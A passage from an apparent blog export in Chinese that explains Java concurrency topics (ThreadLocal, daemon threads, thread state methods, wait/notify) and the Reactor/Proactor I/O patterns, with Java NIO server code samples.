ThreadLocal 的子类并且重写 initialValue() 方法，来为一个 ThreadLocal 对象指定一个初始值。就像下面代码展示的那样： 123456private ThreadLocal myThreadLocal = new ThreadLocal&lt;String&gt;() &#123; @Override protected String initialValue() &#123; return \"This is the initial value\"; &#125;&#125;; 一个完整的ThreadLocal例子下面是一个完整的可执行的 ThreadLocal 例子： 123456789101112131415161718192021public class ThreadLocalExample &#123; public static class MyRunnable implements Runnable &#123; private ThreadLocal threadLocal = new ThreadLocal(); @Override public void run() &#123; threadLocal.set((int) (Math.random() * 100D)); try &#123; Thread.sleep(2000); &#125; catch (InterruptedException e) &#123; &#125; System.out.println(threadLocal.get()); &#125; &#125; public static void main(String[] args) &#123; MyRunnable sharedRunnableInstance = new MyRunnable(); Thread thread1 = new Thread(sharedRunnableInstance); Thread thread2 = new Thread(sharedRunnableInstance); thread1.start(); thread2.start(); &#125;&#125; 上面的例子创建了一个MyRunnable实例，并将该实例作为参数传递给两个线程。两个线程分别执行run()方法，并且都在ThreadLocal实例上保存了不同的值。如果它们访问的不是ThreadLocal对象并且调用的set()方法被同步了，则第二个线程会覆盖掉第一个线程设置的值。但是，由于它们访问的是一个ThreadLocal对象，因此这两个线程都无法看到对方保存的值。也就是说，它们存取的是两个不同的值。 Reference Java ThreadLocal的使用 - http://ifeve.com/java-threadlocal%E7%9A%84%E4%BD%BF%E7%94%A8/ java并发编程学习: ThreadLocal使用及原理 - https://www.cnblogs.com/yjmyzz/p/threadlocal-demo.html Java进阶（七）正确理解Thread Local的原理与适用场景 - http://www.jasongj.com/java/threadlocal/","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】多线程 - 守护线程（Daemon Thread）","date":"2019-02-26T13:35:47.000Z","path":"2019/02/26/【Java】多线程-守护线程/","text":"守护线程（Daemon Thread）在 Java 中有两类线程：User Thread（用户线程）、Daemon Thread（守护线程）。 用个比较通俗的比如，任何一个守护线程都是整个JVM中所有非守护线程的保姆。 只要当前 JVM 实例中还存在任何一个没有结束的非守护线程，守护线程就仍然工作。只有当最后一个非守护线程结束时，守护线程随着 JVM 一同结束而结束。守护线程的作用是为其他线程的运行提供便利服务，守护线程最典型的应用就是 GC (垃圾回收器)，它就是一个很称职的守护者。 用户线程和守护线程两者几乎没有区别，唯一的不同之处就在于是否导致 JVM 的结束：如果用户线程已经全部退出运行了，只剩下守护线程存在了，JVM 也就退出了。 因为没有被守护者了，守护线程也就没有工作可做了，也就没有继续运行程序的必要了。 创建守护进程值得一提的是，守护线程并非只有虚拟机内部提供，用户在编写程序时也可以自己设置守护线程。下面的方法就是用来设置守护线程的。 1234567Thread daemonTread = new Thread(); // 设定 daemonThread 为 守护线程，default false(非守护线程) daemonThread.setDaemon(true); // 验证当前线程是否为守护线程，返回 true 则为守护线程 daemonThread.isDaemon(); 这里有几点需要注意： IllegalThreadStateException异常。你不能把正在运行的常规线程设置为守护线程。 在守护线程中产生的新线程也是守护线程的。 不要认为所有的应用都可以分配给守护线程来进行服务，比如读写操作或者计算逻辑。 当我们在Java程序中创建一个线程，它就被称为用户线程。一个守护线程是在后台执行并且不会阻止JVM终止的线程。当没有用户线程在运行的时候，JVM关闭程序并且退出。一个守护线程创建的子线程依然是守护线程。 Reference Java中守护线程的总结 - https://blog.csdn.net/shimiso/article/details/8964414","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Network】两种高性能I/O设计模式（Reactor/Proactor）","date":"2019-02-26T04:09:48.000Z","path":"2019/02/26/【Network】高性能网络编程-两种高性能I-O设计模式（Reactor-Proactor）/","text":"背景一般情况下，I/O 复用机制需要事件多路分离器（event demultiplexor）。 事件多路分离器的作用，即将那些读写事件源分发（dispatch）给各读写事件处理者（event handlers），就像送快递的在楼下喊：谁的什么东西送了，快来拿吧。因为事件多路分离器同时承担事件分发的智能，因此也称为分发者（dispatcher）。 在此之前，开发人员在开始的时候需要在事件多路分离器那里注册感兴趣的事件，并提供相应的事件处理者，或者是回调函数；事件多路分离器在适当的时候，会将请求的事件分发给这些事件处理者或者回调函数。 *两个与事件多路分离器有关的模式是 Reactor 和 Proactor 。 * Reactor 模式是基于同步 I/O 的； Proactor 模式基于异步 I/O。 类比我们以一个餐饮店为例，假设每一个人来就餐就是一个 I/O 操作，他会先看一下菜单，然后点餐。就像一个网站会有很多的请求，要求服务器做一些事情。处理这些就餐事件的就是我们需要解决的问题了。 多线程的并发解决方案在传统的基于多线程的处理方式会是这样的： 一个人来就餐，一个服务员去服务，然后客人点菜。 服务员将菜单给后厨。 十个人来就餐，十个服务员去服务…… 这个就是多线程的处理方式，一个请求到来，就会有一个线程服务。很显然这种方式在人少的情况下会有很好的用户体验，每个客人都感觉自己是VIP，专人服务的。如果餐厅一直这样同一时间最多来10个客人，这家餐厅是可以很好的服务下去的。 那么问题来了，如果这家餐厅生意非常好，同时就餐人数（网站并发访问量）达到100人呢，给每个客人分配一个服务员餐馆则需要很高的人力成本（需要很高的服务器配置资源）。 尽管可以考虑使用类似线程池的方法，组成一个10个服务员的线程池，一个服务员服务完一个人后继续去服务下一个。 但是这样也有比较严重的缺点，如果某个客人点菜很慢（读写大文件或长网路请求），其他人可能就要等好长时间了。即使为了减少客人的等待时间，一个服务员在等待一个客人点菜思考的时候，跑到另一个客人那抓紧处理他的点菜，服务员切换到不同的点菜服务（线程的上下文切换）也是需要消耗额外的资源的（比如服务员需要询问当前是多少桌号）。 事件驱动的解决方案其实当客人在点菜的时候，服务员可以先把菜单给客户（响应新的网络请求），此后，服务员就去做别的事情了（非阻塞地），当客人想好要吃的菜后，大喊一声“服务员”，服务员再去服务。显然，服务员可以同时观察多个客户当前是否有喊“服务员”（I/O多路复用）。 客人将需要的菜告诉服务员，然后服务员就可以立刻去服务下一个人了，这样是不是能够有效利用服务员的资源？ 其实这就是基于事件的解决方案，“做好之后放到14桌”其实就是回调函数。 Reactor 模型经典的 Reactor 单线程模型经典的 Reactor 单线程模型如下所示： 在Reactor模式中，包含如下角色： Reactor：将I/O事件发派给对应的Handler Acceptor：处理客户端连接请求 Handlers：执行非阻塞读/写 经典的 Reactor 单线程模型实现代码如下所示： 12345678910111213141516171819202122232425262728293031323334353637public class NIOServer &#123; private static final Logger LOGGER = LoggerFactory.getLogger(NIOServer.class); public static void main(String[] args) throws IOException &#123; Selector selector = Selector.open(); ServerSocketChannel serverSocketChannel = ServerSocketChannel.open(); serverSocketChannel.configureBlocking(false); serverSocketChannel.bind(new InetSocketAddress(1234)); serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT); while (selector.select() &gt; 0) &#123; Set&lt;SelectionKey&gt; keys = selector.selectedKeys(); Iterator&lt;SelectionKey&gt; iterator = keys.iterator(); while (iterator.hasNext()) &#123; SelectionKey key = iterator.next(); iterator.remove(); if (key.isAcceptable()) &#123; ServerSocketChannel acceptServerSocketChannel = (ServerSocketChannel) key.channel(); SocketChannel socketChannel = acceptServerSocketChannel.accept(); socketChannel.configureBlocking(false); LOGGER.info(\"Accept request from &#123;&#125;\", socketChannel.getRemoteAddress()); socketChannel.register(selector, SelectionKey.OP_READ); &#125; else if (key.isReadable()) &#123; SocketChannel socketChannel = (SocketChannel) key.channel(); ByteBuffer buffer = ByteBuffer.allocate(1024); int count = socketChannel.read(buffer); if (count &lt;= 0) &#123; socketChannel.close(); key.cancel(); LOGGER.info(\"Received invalide data, close the connection\"); continue; &#125; LOGGER.info(\"Received message &#123;&#125;\", new String(buffer.array())); &#125; keys.remove(key); &#125; &#125; &#125;&#125; 为了方便阅读，上示代码将Reactor模式中的所有角色放在了一个类中。 从上示代码中可以看到，多个Channel可以注册到同一个Selector对象上，实现了一个线程同时监控多个请求状态（Channel）。同时注册时需要指定它所关注的事件，例如上示代码中socketServerChannel对象只注册了OP_ACCEPT事件，而socketChannel对象只注册了OP_READ事件。 selector.select()是阻塞的，当有至少一个通道可用时该方法返回可用通道个数。同时该方法只捕获Channel注册时指定的所关注的事件。 不足： 在一些小容量应用场景下，可以使用单线程模型。但是这对于高负载、大并 发的应用场景却不合适，主要原因如下： 一个NIO线程同时处理成百上千的链路，性能上无法支撑，即便NIO线程的 CPU 负荷达到100%，也无法满足海量消息的编码、解码、读取和发送。 当NIO线程负载过重之后，处理速度将变慢，这会导致大量客户端连接超时，超时之后往往会进行重发，这更加重了NIO线程的负载，最终会导致 大量消息积压和处理超时，成为系统的性能瓶颈。 可靠性问题：一旦NIO线程意外跑飞，或者进入死循环，会导致整个系统通信模块不可用，不能接收和处理外部消息，造成节点故障。 为了解决这些问题， 演进出了 Reactor 多线程模型。 Reactor 多线程模型Rector 多线程模型与单线程模型最大的区别就是有一组 NIO 线程来处理 I/O 操作。 经典Reactor模式中，尽管一个线程可同时监控多个请求（Channel），但是所有读/写请求以及对新连接请求的处理都在同一个线程中处理，无法充分利用多CPU的优势，同时读/写操作也会阻塞对新连接请求的处理。因此可以引入多线程，并行处理多个读/写操作，如下图所示。 Reactor 多线程模型的特点如下： 有专门一个NIO线程——Acceptor线程用于监听服务端，接收客户端的TCP 连接请求。 网络I/O操作（读、写等）由一个NIO线程池负责，线程池可以采用标准的 JDK线程池实现，它包含一个任务队列和N个可用的线程，由这些NIO线程 负责消息的读取、解码、编码和发送。 一个NIO线程可以同时处理N条链路，但是一个链路只对应一个NIO线程， 防止发生并发操作问题。 在绝大多数场景下，Reactor 多线程模型可以满足性能需求。 但是，在个别特殊场景中，一个 NIO 线程负责监听和处理所有的客户端连接可能会存在性能问题。例如并发百万客户端连接，或者服务端需要对客户端握手进行安全认证，但是认证本身非常损耗性能。在这类场景下，单独一个 Acceptor 线程可能会存在性能不足的问题，为了解决性能问题，产生了第三种 Reactor 线程模型——主从 Reactor 多线程模型。 多线程Reactor模式示例代码如下所示。 1234567891011121314151617181920212223242526272829303132public class NIOServer &#123; private static final Logger LOGGER = LoggerFactory.getLogger(NIOServer.class); public static void main(String[] args) throws IOException &#123; Selector selector = Selector.open(); ServerSocketChannel serverSocketChannel = ServerSocketChannel.open(); serverSocketChannel.configureBlocking(false); serverSocketChannel.bind(new InetSocketAddress(1234)); serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT); while (true) &#123; if(selector.selectNow() &lt; 0) &#123; continue; &#125; Set&lt;SelectionKey&gt; keys = selector.selectedKeys(); Iterator&lt;SelectionKey&gt; iterator = keys.iterator(); while(iterator.hasNext()) &#123; SelectionKey key = iterator.next(); iterator.remove(); if (key.isAcceptable()) &#123; ServerSocketChannel acceptServerSocketChannel = (ServerSocketChannel) key.channel(); SocketChannel socketChannel = acceptServerSocketChannel.accept(); socketChannel.configureBlocking(false); LOGGER.info(\"Accept request from &#123;&#125;\", socketChannel.getRemoteAddress()); SelectionKey readKey = socketChannel.register(selector, SelectionKey.OP_READ); readKey.attach(new Processor()); &#125; else if (key.isReadable()) &#123; Processor processor = (Processor) key.attachment(); processor.process(key); &#125; &#125; &#125; &#125;&#125; 从上示代码中可以看到，注册完SocketChannel的OP_READ事件后，可以对相应的SelectionKey attach一个对象（本例中attach了一个Processor对象，该对象处理读请求），并且在获取到可读事件后，可以取出该对象。 注：attach对象及取出该对象是NIO提供的一种操作，但该操作并非Reactor模式的必要操作，本文使用它，只是为了方便演示NIO的接口。 具体的读请求处理在如下所示的Processor类中。该类中设置了一个静态的线程池处理所有请求。而process方法并不直接处理I/O请求，而是把该I/O操作提交给上述线程池去处理，这样就充分利用了多线程的优势，同时将对新连接的处理和读/写操作的处理放在了不同的线程中，读/写操作不再阻塞对新连接请求的处理。 123456789101112131415161718192021public class Processor &#123; private static final Logger LOGGER = LoggerFactory.getLogger(Processor.class); private static final ExecutorService service = Executors.newFixedThreadPool(16); public void process(SelectionKey selectionKey) &#123; service.submit(() -&gt; &#123; ByteBuffer buffer = ByteBuffer.allocate(1024); SocketChannel socketChannel = (SocketChannel) selectionKey.channel(); int count = socketChannel.read(buffer); if (count &lt; 0) &#123; socketChannel.close(); selectionKey.cancel(); LOGGER.info(\"&#123;&#125;\\t Read ended\", socketChannel); return null; &#125; else if(count == 0) &#123; return null; &#125; LOGGER.info(\"&#123;&#125;\\t Read message &#123;&#125;\", socketChannel, new String(buffer.array())); return null; &#125;); &#125;&#125; 主从 Reactor 多线程模型主从 Reactor 线程模型的特点是：服务端用于接收客户端连接的不再是一 个单独的 NIO 线程， 而是一个独立的 NIO 线程池。 Acceptor 接收到客户端 TCP连接请求并处理完成后（可能包含接入认证等），将新创建的 SocketChannel 注册到 I/O 线程池（sub reactor 线程池） 的某 I/O 线程上， 由它负责 SocketChannel 的读写和编解码工作。Acceptor 线程池仅仅用于客户端的登录、 握手和安全认证，一旦链路建立成功，就将链路注册到后端 subReactor 线程池 的 I/O 线程上，由 I/O 线程负责后续的 I/O 操作。 Netty中使用的Reactor模式，引入了多Reactor，也即一个主Reactor负责监控所有的连接请求，多个子Reactor负责监控并处理读/写请求，减轻了主Reactor的压力，降低了主Reactor压力太大而造成的延迟。并且每个子Reactor分别属于一个独立的线程，每个成功连接后的Channel的所有操作由同一个线程处理。这样保证了同一请求的所有状态和上下文在同一个线程中，避免了不必要的上下文切换，同时也方便了监控请求响应状态。 主从Reactor模式示意图如下所示： 多Reactor示例代码如下所示。 12345678910111213141516171819202122232425262728293031public class NIOServer &#123; private static final Logger LOGGER = LoggerFactory.getLogger(NIOServer.class); public static void main(String[] args) throws IOException &#123; Selector selector = Selector.open(); ServerSocketChannel serverSocketChannel = ServerSocketChannel.open(); serverSocketChannel.configureBlocking(false); serverSocketChannel.bind(new InetSocketAddress(1234)); serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT); int coreNum = Runtime.getRuntime().availableProcessors(); Processor[] processors = new Processor[coreNum]; for (int i = 0; i &lt; processors.length; i++) &#123; processors[i] = new Processor(); &#125; int index = 0; while (selector.select() &gt; 0) &#123; Set&lt;SelectionKey&gt; keys = selector.selectedKeys(); for (SelectionKey key : keys) &#123; keys.remove(key); if (key.isAcceptable()) &#123; ServerSocketChannel acceptServerSocketChannel = (ServerSocketChannel) key.channel(); SocketChannel socketChannel = acceptServerSocketChannel.accept(); socketChannel.configureBlocking(false); LOGGER.info(\"Accept request from &#123;&#125;\", socketChannel.getRemoteAddress()); Processor processor = processors[(int) ((index++) % coreNum)]; processor.addChannel(socketChannel); processor.wakeup(); &#125; &#125; &#125; &#125;&#125; 如上代码所示，本文设置的子Reactor个数是当前机器可用核数的两倍（与Netty默认的子Reactor个数一致）。对于每个成功连接的SocketChannel，通过round robin的方式交给不同的子Reactor。 子Reactor对SocketChannel的处理如下所示。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647public class Processor &#123; private static final Logger LOGGER = LoggerFactory.getLogger(Processor.class); private static final ExecutorService service = Executors.newFixedThreadPool(2 * Runtime.getRuntime().availableProcessors()); private Selector selector; public Processor() throws IOException &#123; this.selector = SelectorProvider.provider().openSelector(); start(); &#125; public void addChannel(SocketChannel socketChannel) throws ClosedChannelException &#123; socketChannel.register(this.selector, SelectionKey.OP_READ); &#125; public void wakeup() &#123; this.selector.wakeup(); &#125; public void start() &#123; service.submit(() -&gt; &#123; while (true) &#123; if (selector.select(500) &lt;= 0) &#123; continue; &#125; Set&lt;SelectionKey&gt; keys = selector.selectedKeys(); Iterator&lt;SelectionKey&gt; iterator = keys.iterator(); while (iterator.hasNext()) &#123; SelectionKey key = iterator.next(); iterator.remove(); if (key.isReadable()) &#123; ByteBuffer buffer = ByteBuffer.allocate(1024); SocketChannel socketChannel = (SocketChannel) key.channel(); int count = socketChannel.read(buffer); if (count &lt; 0) &#123; socketChannel.close(); key.cancel(); LOGGER.info(\"&#123;&#125;\\t Read ended\", socketChannel); continue; &#125; else if (count == 0) &#123; LOGGER.info(\"&#123;&#125;\\t Message size is 0\", socketChannel); continue; &#125; else &#123; LOGGER.info(\"&#123;&#125;\\t Read message &#123;&#125;\", socketChannel, new String(buffer.array())); &#125; &#125; &#125; &#125; &#125;); &#125;&#125; 在Processor中，同样创建了一个静态的线程池，且线程池的大小为机器核数的两倍。每个Processor实例均包含一个Selector实例。同时每次获取Processor实例时均提交一个任务到该线程池，并且该任务正常情况下一直循环处理，不会停止。而提交给该Processor的SocketChannel通过在其Selector注册事件，加入到相应的任务中。由此实现了每个子Reactor包含一个Selector对象，并由一个独立的线程处理。 模拟ProactorProactor模式在 Reactor 模式中，Reactor 等待某个事件或者可应用或者操作的状态发生（比如文件描述符可读写，或者是 Socket 可读写）。 然后把这个事件传给事先注册的 Handler（事件处理函数或者回调函数），由后者来做实际的读写操作。 其中的读写操作都需要应用程序同步操作，所以 Reactor 是非阻塞同步网络模型。 如果把 I/O 操作改为异步，即交给操作系统来完成就能进一步提升性能，这就是异步网络模型 Proactor。 Proactor 是和异步 I/O 相关的，详细方案如下： Proactor Initiator 创建 Proactor 和 Handler 对象，并将 Proactor 和 Handler 都通过 AsyOptProcessor（Asynchronous Operation Processor）注册到内核； AsyOptProcessor 处理注册请求，并处理 I/O 操作； AsyOptProcessor 完成 I/O 操作后通知 Proactor； Proactor 根据不同的事件类型回调不同的 Handler 进行业务处理； Handler 完成业务处理。 可以看出 Proactor 和 Reactor 的区别： 但是Proactor有如下缺点： 编程复杂性，由于异步操作流程的事件的初始化和事件完成在时间和空间上都是相互分离的，因此开发异步应用程序更加复杂。应用程序还可能因为反向的流控而变得更加难以 Debug； 内存使用，缓冲区在读或写操作的时间段内必须保持住，可能造成持续的不确定性，并且每个并发操作都要求有独立的缓存，相比 Reactor 模式，在 Socket 已经准备好读或写前，是不要求开辟缓存的； 操作系统支持，Windows 下通过 IOCP 实现了真正的异步 I/O，而在 Linux 系统下，Linux 2.6 才引入，目前异步 I/O 还不完善。 总结总结来说，Reactor 和 Proactor 模式的主要区别就是真正的读取和写入操作是由谁来完成的，Reactor 中需要工作线程自己来完成数据读取或者写入，而Proactor模式中，应用程序不需要进行实际的读写过程，它只需要从缓存区读取或者写入即可，操作系统会读取缓存区或者写入缓存区到 I/O 设备。 所以说，同步（非阻塞） I/O 模型通常用于实现 Reactor 模式，异步 I/O 模型则用于实现 Proactor 模式。同步情况下（Reactor），调用事件处理器时，表示 I/O 设备可以进行可读或可写操作（can read or can write）；异步情况下（Proactor），当调用事件处理器时，表示 I/O 操作已经完成。 在Proactor中实现读： 处理器发起异步读操作（注意：操作系统必须支持异步IO）。在这种情况下，处理器无视IO就绪事件，它关注的是完成事件。 事件分离器等待操作完成事件 在分离器等待过程中，操作系统利用并行的内核线程执行实际的读操作，并将结果数据存入用户自定义缓冲区，最后通知事件分离器读操作完成。 事件分离器呼唤处理器。 事件处理器处理用户自定义缓冲区中的数据，然后启动一个新的异步操作，并将控制权返回事件分离器。 可以看出，两个模式的相同点，都是对某个IO事件的事件通知(即告诉某个模块，这个IO操作可以进行或已经完成)。在结构上，两者也有相同点：demultiplexor负责提交IO操作(异步)、查询设备是否可操作(同步)，然后当条件满足时，就回调handler；不同点在于，异步情况下(Proactor)，当回调handler时，表示IO操作已经完成；同步情况下(Reactor)，回调handler时，表示IO设备可以进行某个操作(can read or can write)。 因此，Proactor 模式需要操作系统提供异步 I/O API。 模拟异步我们将尝试提供一种融合了Proactor和Reactor两种模式的解决方案。 为了演示这个方案，我们将Reactor稍做调整，模拟成异步的Proactor模型（主要是在事件分离器里完成本该事件处理者做的实际读写工作，我们称这种方法为”模拟异步“）。 //TO DO 例子Reactor:libevent/libev/libuv/ZeroMQ/Event Library in Redis Nginx 采用 master-slave 模型 Node.js Reference Wikepedia Reactor pattern - https://en.wikipedia.org/wiki/Reactor_pattern Reactor An Object Behavioral Pattern forDemultiplexing and Dispatching Handles for Synchronous Events - http://www.dre.vanderbilt.edu/~schmidt/PDF/reactor-siemens.pdf Understanding Reactor Pattern: Thread-Based and Event-Driven - https://dzone.com/articles/understanding-reactor-pattern-thread-based-and-eve Scalable IO in Java - http://gee.cs.oswego.edu/dl/cpjslides/nio.pdf","comments":true,"categories":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/categories/Network/"},{"name":"NetworkProgramming","slug":"Network/NetworkProgramming","permalink":"http://swsmile.info/categories/Network/NetworkProgramming/"}],"tags":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/tags/Network/"},{"name":"Network Programming","slug":"Network-Programming","permalink":"http://swsmile.info/tags/Network-Programming/"}]},{"title":"【Java】多线程 - 线程状态切换函数","date":"2019-02-25T13:24:24.000Z","path":"2019/02/25/【Java】多线程-线程状态切换函数/","text":"Java的线程状态Java语言中定义了6种线程状态，在任意一个时间点，一个线程有且只有其中一种状态，这6种状态是： 新建（New）：一个已经被实例化线程对象但未被启动（start）的线程处于这种状态。 可运行（Runnable）：包括了操作系统线程状态中的 Running 和 Ready。因此，处于此状态的线程有可能正在执行，也有可能正在等待着CPU为它分配执行时间（CPU时间片）。 无限期等待（Waiting）：线程处于无限期等待表示它需要等待并获得其他线程的指示后才能继续运行。处于这种状态的线程不会被分配CPU执行时间，直到当其他的一个线程完成了一个操作后显式地通知这个线程。 限期等待（Timed Waiting）：处于这种状态的线程也不会被分配CPU执行时间，不过无须等待被其他线程显式地唤醒，在一定时间之后它们会由操作系统自动唤醒，以结束限期等待状态。 阻塞（Blocked）：线程被阻塞了，在等待进入同步区域（synchronized）时，线程将进入这种状态。处于阻塞态的线程会不断请求资源，一旦请求成功，就会进入就绪队列，等待执行。 结束（Terminated）：已终止的线程状态，线程已经结束执行。 注意，以上所指的线程状态均是 Java 线程在 JVM 中的状态，因此并不意味着此时对应于操作系统中的线程状态。 线程状态切换方法Thread.sleep(sleeptime) - 线程主动休眠public static native void sleep(long millis) 方法是 Thread 类的一个静态原生方法。 当一个线程调用了 Thread.sleep(sleeptime) 后，它会休眠指定的时间（本质是进入限期等待状态）。在经过了指定时间后，会切换成就绪状态，等待在被 JVM 调度器重新切换为运行状态。 需要注意的是，线程调用 Thread.sleep(sleeptime) 后，仅仅释放 CPU 使用权，而所持有的锁仍然占用。 换句话说，如果当前线程已经获得了锁，在调用了 Thread.sleep(sleeptime) 方法后并不会释放锁。这也是 sleep 方法经常拿来与 Object.wait() 方法进行比较的点。Object.wait() 方法会释放CPU执行权 和 占有的锁。 Thread.yield() - 主动让出CPU时间片public static native void yield()是 Thread 类的一个静态原生方法。 yield 意味着放手，放弃，投降。一个调用 yield() 方法的线程告诉虚拟机，它乐意让其他线程占用自己的位置。这表明该线程没有在做一些紧急的事情。 换句话说，Thread.yield() 的调用会显式地让当前线程让出CPU时间片，此后当前线程会从运行态切换为就绪态。 因此，Thread.yield() 仅释放CPU执行权，锁仍然占用。线程会被放入就绪队列，会在短时间内再次被执行。 Thread.join() - 线程间协作public final synchronized void join(long millis) 是 Thread 实例的一个方法，是线程间协作的一种方式。 当线程A调用了线程B实例的join()方法时，线程A会进入无限期等待状态（被阻塞在join()方法的调用位置），直到当线程B执行结束（线程B进入结束（Terminated）状态）时，线程A才从无限期等待状态切换为就绪状态。 很多时候，一个线程的输入依赖于另一个线程的输出，这个线程会等待，直到另一个线程已经获取到数据后，这个线程才会继续执行后续操作。 比如： 12345678910111213141516171819202122232425262728293031323334353637import java.util.Date;import java.util.concurrent.TimeUnit;public class Main implements Runnable &#123; private String name; public Main(String name) &#123; this.name = name; &#125; public void run() &#123; System.out.printf(\"Thread %s begins: %s\\n\", name, new Date()); try &#123; TimeUnit.SECONDS.sleep(4); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; System.out.printf(\"Thread %s has finished: %s\\n\", name, new Date()); &#125; public static void main(String[] args) &#123; Thread thread1 = new Thread(new Main(\"One\")); Thread thread2 = new Thread(new Main(\"Two\")); thread1.start(); thread2.start(); try &#123; thread1.join(); thread2.join(); &#125; catch (InterruptedException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; System.out.println(\"Main thread is finished\"); &#125;&#125; 运行结果12345Thread One begins: Fri Feb 01 15:26:22 CST 2019Thread Two begins: Fri Feb 01 15:26:22 CST 2019Thread Two has finished: Fri Feb 01 15:26:26 CST 2019Thread One has finished: Fri Feb 01 15:26:26 CST 2019Main thread is finished 分析由于 Main 主线程调用了 thread1.join(); 和 thread2.join(); ，调用后，主线程会进入无限期等待状态。当线程 One 和 线程 Two 都执行完成时（都进入了结束状态），主线程才会从无限期等待状态切换为就绪状态，最终打印Main thread is finished。 若主线程不调用thread1.join();和thread2.join();，运行结果将会是： 12345Main thread is finishedThread One begins: Fri Feb 01 15:29:18 CST 2019Thread Two begins: Fri Feb 01 15:29:18 CST 2019Thread One has finished: Fri Feb 01 15:29:22 CST 2019Thread Two has finished: Fri Feb 01 15:29:22 CST 2019 因为，在线程 One 和 线程 Two 被置为可执行状态后（然而还未被 JVM 的线程调度器切换为运行状态），主线程就打印了Main thread is finished。 Object.wait() - 线程间协作Object.wait() 方法会释放CPU执行权和占有的锁。 Object.wait() 与 Thread.sleep(sleeptime) 的区别 sleep()方法是Thread类的静态方法，而wait是Object实例方法。 wait()方法必须要在 synchronized 同步方法或者同步块中调用，也就是必须已经获得对象锁；而 sleep() 方法没有这个限制可以在任何地方种使用。另外，wait()方法的调用会释放占有的锁对象，使得该线程进入等待池（Waiting Pool）中，等待下一次获取资源。而sleep()方法只是会让出CPU但不会释放掉锁对象。 调用sleep()方法后，在休眠时间达到后，如果再次获得CPU时间片就会继续执行；而在调用wait()方法，必须在得到通知后（其他线程调用了Object.notify() /Object.notifyAll() 方法），才会离开等待池，此后进入阻塞状态。当成功获得锁后，才会进入就绪状态。 Object.notify()/notifyAll() - 线程间协作线程间通信 - wait()/notify()的例子特点 wait()、notify() 和 notifyAll() 方法均为 Object 类的方法，因此 Java 中所有的类实例都具有这三个方法。 wait() 和 notify() 方法要求在调用时线程已经获得了对象的锁，因此对这三个方法的调用需要放在 synchronized 方法或 synchronized 块中。 调用某个对象的 wait() 方法能让当前线程阻塞，并且当前线程必须拥有此对象的锁。 调用某个对象的notify()方法能够唤醒一个正在等待这个对象的monitor的线程，如果有多个线程都在等待这个对象的monitor，则只能唤醒其中一个线程。 调用notifyAll()方法能够唤醒所有正在等待这个对象的monitor的线程。 有朋友可能会有疑问：为何这三个方法不在 Thread 类中声明，而是 Object 类中声明的方法（当然由于 Thread 类继承了Object类，所以 Thread 也可以调用者三个方法）？ 其实这个问题很简单，由于每个对象都拥有monitor（即锁），所以让当前线程等待某个对象的锁，当然应该通过这个对象来操作了。而不是用当前线程来操作，因为当前线程可能会等待多个线程的锁，如果通过线程来操作，就非常复杂了。 拥有锁对象一个线程变为一个对象的锁的拥有者是通过下列三种方法： 执行这个对象的 synchronized 实例方法。 执行这个对象的 synchronized 语句块。这个语句块锁的是这个对象。 对于 Class 类的对象，执行那个类的 synchronized、static方法。 线程调用了 wait() 方法之后，会释放掉当前拥有的锁，并进入等待池（Wait pool） ；当这个线程收到其他线程的通知（其他线程调用 notify() ）之后，等待获取锁（在未获取到锁之前，处于阻塞状态），获取锁之后继续运行。 代码利用两个线程，对一个整形成员变量进行变化，一个线程对该变量增加，一个线程对该变量减少。利用线程间的通信（wait()/notify()），最终实现该整形变量 0101 这样交替的变更。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100class NumberHolder &#123; private int number; public synchronized void increase() &#123; if (0 != number) &#123; try &#123; wait(); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125;// // 能执行到这里说明已经被唤醒 // 并且number为0 number++; System.out.println(number); // 通知在等待的线程 notify(); &#125; public synchronized void decrease() &#123; if (0 == number) &#123; try &#123; wait(); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; // 能执行到这里说明已经被唤醒 // 并且number不为0 number--; System.out.println(number); notify(); &#125;&#125;class IncreaseThread extends Thread &#123; private NumberHolder numberHolder; public IncreaseThread(NumberHolder numberHolder) &#123; this.numberHolder = numberHolder; &#125; @Override public void run() &#123; for (int i = 0; i &lt; 5; ++i) &#123; // 进行一定的延时 try &#123; Thread.sleep((long) Math.random() * 1000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; // 进行增加操作 numberHolder.increase(); &#125; &#125;&#125;class DecreaseThread extends Thread &#123; private NumberHolder numberHolder; public DecreaseThread(NumberHolder numberHolder) &#123; this.numberHolder = numberHolder; &#125; @Override public void run() &#123; for (int i = 0; i &lt; 5; ++i) &#123; // 进行一定的延时 try &#123; Thread.sleep((long) Math.random() * 1000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; // 进行减少操作 numberHolder.decrease(); &#125; &#125;&#125;public class Main &#123; public static void main(String[] args) &#123; NumberHolder numberHolder = new NumberHolder(); Thread t1 = new IncreaseThread(numberHolder); Thread t2 = new DecreaseThread(numberHolder); t1.start(); t2.start(); &#125;&#125; 运行结果123456789101010101010 ConditionCondition 是在 Java 1.5 中才出现的，它用来替代传统的 Object 的 wait()、notify() 实现线程间的协作，相比使用 Object 的 wait()、notify()，使用Condition 的 await()、signal() 这种方式实现线程间协作更加安全和高效。因此通常来说比较推荐使用 Condition。 Condition是个接口，基本的方法就是await()和signal()方法； Condition依赖于Lock接口，生成一个Condition的基本代码是lock.newCondition() 调用Condition的await()和signal()方法，都必须在lock保护之内，就是说必须在lock.lock()和lock.unlock之间才可以使用 Reference Oracle Enum Thread.State - https://docs.oracle.com/javase/7/docs/api/java/lang/Thread.State.html Java 6 Thread States and Life Cycle - https://www.uml-diagrams.org/examples/java-6-thread-state-machine-diagram-example.html 《Modern Operating System 4th》 